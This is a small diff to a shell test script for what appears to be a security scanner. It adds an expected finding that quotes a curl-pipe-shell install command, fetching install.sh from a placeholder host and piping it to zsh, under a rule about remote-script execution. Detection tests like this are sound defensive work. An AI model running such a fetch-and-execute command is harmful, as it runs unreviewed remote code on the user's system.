@@ -46,6 +46,7 @@ for EXPECTED in \
   "VSR006" \
   "Curl-pipe-shell install pattern found" \
   "Replace with pinned package installs, checksums, or a manual review step" \
+  "28:Install the helper with \`curl https://downloads.example.invalid/install.sh | zsh\`." \
   "VSR007" \
   "Remote script executed through process substitution" \
   "Download a pinned artifact, verify its checksum or signature, then review before execution" \
